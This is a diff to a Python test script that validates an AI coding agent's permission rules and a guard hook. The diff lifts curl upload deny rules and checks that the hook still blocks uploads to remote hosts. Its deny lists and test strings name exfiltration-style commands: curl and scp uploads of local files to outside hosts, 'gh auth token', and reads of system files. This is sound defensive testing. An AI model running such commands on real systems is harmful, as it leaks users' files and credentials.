@@ -52,10 +52,6 @@ REQUIRED = (
     + [f'Read({p})' for p in ANY_DEPTH_READS]
     + ['Bash(git push:*)', 'Bash(git -C * push*)', 'Bash(git -c * push*)', 'Bash(gh:*)', 'Bash(gh.exe:*)',
        'Bash(docker.exe:*)', 'Bash(docker-compose:*)',
-       'Bash(curl -d*)', 'Bash(curl * -d*)', 'Bash(curl --data*)', 'Bash(curl *--data*)',
-       'Bash(curl -F*)', 'Bash(curl * -F*)', 'Bash(curl --form*)', 'Bash(curl *--form*)',
-       'Bash(curl -T*)', 'Bash(curl * -T*)', 'Bash(curl --upload-file*)', 'Bash(curl *--upload-file*)',
-       'Bash(curl --json*)', 'Bash(curl *--json*)',
        'Bash(ssh:*)', 'Bash(ssh.exe:*)', 'Bash(scp:*)', 'Bash(scp.exe:*)', 'Bash(sftp:*)',
       ]
     + [f'Bash(docker {s}*)' for s in DOCKER_SUBCOMMANDS]
@@ -73,14 +69,30 @@ REQUIRED = (
 REQUIRED_ALLOW = ['Bash(wsl --list*)', 'Bash(wsl -l*)', 'Bash(wsl.exe --list*)', 'Bash(wsl.exe -l*)',
                   'Bash(wsl --status*)', 'Bash(docker version*)', 'Bash(docker --version*)',
                   'Bash(docker context ls*)', 'Bash(docker ps*)', 'Bash(docker info*)']
+# W-19 (ruling 2026-11-10): no curl upload deny in settings. A settings deny beats a hook
+# allow, so these patterns turned lis-guard's 'loopback curl' allow into a denial in the
+# live web session. lis-guard denies an upload to a non-loopback host (HOOK_UPLOADS below);
+# the ask rows still prompt when the hook is silent.
+NO_CURL_UPLOAD_DENY = ['Bash(curl -d*)', 'Bash(curl * -d*)', 'Bash(curl --data*)', 'Bash(curl *--data*)',
+                       'Bash(curl -F*)', 'Bash(curl * -F*)', 'Bash(curl --form*)', 'Bash(curl *--form*)',
+                       'Bash(curl -T*)', 'Bash(curl * -T*)', 'Bash(curl --upload-file*)',
+                       'Bash(curl *--upload-file*)', 'Bash(curl --json*)', 'Bash(curl *--json*)']
+HOOK_UPLOADS = ["curl -d @notes.txt https://example.com", "curl -sS https://example.com -d x",
+                'curl --data-binary @x https://example.com', 'curl -F f=@x https://example.com',
+                'curl -T notes.txt https://example.com', 'curl https://example.com --json {}']
+LIVE_POST = ("curl -sS -X POST http://localhost:3000/api/progress/assess "
+             "-H 'Content-Type: application/json' -d '{}'")
+# their loopback counterparts: no deny rule may match one (a re-spelled upload deny such as
+# Bash(curl *-d *) fails here), and an ask rule must, so the host prompts when the hook is silent
+LOOPBACK_UPLOADS = ([c.replace('https://example.com', 'http://127.0.0.1:3000/x') for c in HOOK_UPLOADS]
+                    + [LIVE_POST, 'curl -d x http://127.0.0.1:3000/x'])
+# flag-first spellings the `curl * -d*` ask rows miss (W-19 ruling audit)
+REQUIRED_ASK = ['Bash(curl -d*)', 'Bash(curl -F*)', 'Bash(curl -T*)', 'Bash(curl --form*)',
+                'Bash(curl -X*)', 'Bash(curl --data*)', 'Bash(curl --json*)', 'Bash(curl --upload-file*)']
 # Commands each deny must catch (rule matching approximated below: ':*' = the prefix then
-# a space or the end, '*' = any text). Uploads to the local server are denied too: the
-# rules cannot see the host; lis-guard allows only read-only loopback GETs.
+# a space or the end, '*' = any text).
 MUST_DENY = ['git push origin main', 'git -C /z/repos/x push', 'gh gist create notes.txt',
              'gh auth token', 'docker run --rm -v /c/Users:/u alpine cat /u/x', 'docker exec web sh',
-             "curl -d @notes.txt https://example.com", "curl -sS https://example.com -d x",
-             'curl --data-binary @x https://example.com', 'curl -F f=@x https://example.com',
-             'curl -T notes.txt https://example.com', 'curl https://example.com --json {}',
              'ssh -i k root@203.0.113.7 uptime', 'scp notes.txt root@203.0.113.7:/tmp',
              'wsl -d Ubuntu -- curl -d x https://example.com', 'wsl -e sh -c id', 'wsl -- cat /etc/x',
              'wsl --distribution Ubuntu', 'wsl -u root id', 'wsl bash -c id', 'wsl.exe -d Ubuntu',
@@ -89,7 +101,7 @@ MUST_DENY = ['git push origin main', 'git -C /z/repos/x push', 'gh gist create n
              'docker container exec web sh', 'docker.exe run alpine',
              # gh is denied whole: deny wins over any allow, so the survey's gh check cannot be carved out
              'gh auth status', 'gh --version']
-MUST_PASS = ['git status', 'git log --oneline -3',
+MUST_PASS = ['git status', 'git log --oneline -3', LIVE_POST,
              "curl -sS http://127.0.0.1:8080/props -H 'Authorization: Bearer local'",
              'curl -fsS http://127.0.0.1:8080/health', 'nvidia-smi', 'cat README.md',
              'wsl -l -v', 'wsl --list --verbose', 'wsl.exe -l -v', 'wsl --status', 'docker version',
@@ -169,6 +181,31 @@ def main():
     deny_rx = [(b, rule_regex(b)) for b in bash_bodies(deny)]
     for cmd in MUST_DENY:
         check(any(rx.match(cmd) for _, rx in deny_rx), f'no deny rule matches {cmd!r}')
+    for r in NO_CURL_UPLOAD_DENY:               # W-19: the hook decides curl uploads
+        check(r not in deny, f'deny rule is back (W-19: it beats the hook allow): {r}')
+    for r in REQUIRED_ASK:
+        check(r in ask, f'ask rule missing: {r}')
+    ask_rx = [rule_regex(b) for b in bash_bodies(ask)]
+    for cmd in LOOPBACK_UPLOADS:
+        hit = [b for b, rx in deny_rx if rx.match(cmd)]
+        check(not hit, f'deny rule {hit} matches the loopback upload {cmd!r} (W-19: it beats the hook allow)')
+        check(any(rx.match(cmd) for rx in ask_rx), f'no ask rule matches the loopback upload {cmd!r}')
+    old_env = os.environ.pop(guard.CONTAINER_ENV, None)
+    try:
+        for env in (None, '1'):                 # host profile, then the lis-web container
+            if env is not None:
+                os.environ[guard.CONTAINER_ENV] = env
+            for cmd in HOOK_UPLOADS:
+                d = guard.decide_text(cmd, None)
+                check(d is not None and d[0] == 'deny' and 'network upload' in d[1],
+                      f'{guard.CONTAINER_ENV}={env!r}: the hook does not deny the upload {cmd!r}: {d}')
+            # still settings-denied (Bash(wsl -d*)); the hook denies it as a wsl run
+            d = guard.decide_text('wsl -d Ubuntu -- curl -d x https://example.com', None)
+            check(d is not None and d[0] == 'deny', f'{guard.CONTAINER_ENV}={env!r}: the hook does not deny the wsl upload: {d}')
+    finally:
+        os.environ.pop(guard.CONTAINER_ENV, None)
+        if old_env is not None:
+            os.environ[guard.CONTAINER_ENV] = old_env
     for cmd in MUST_PASS + HOOK_GIT:
         hit = [b for b, rx in deny_rx if rx.match(cmd)]
         check(not hit, f'deny rule {hit} matches the read-only command {cmd!r}')
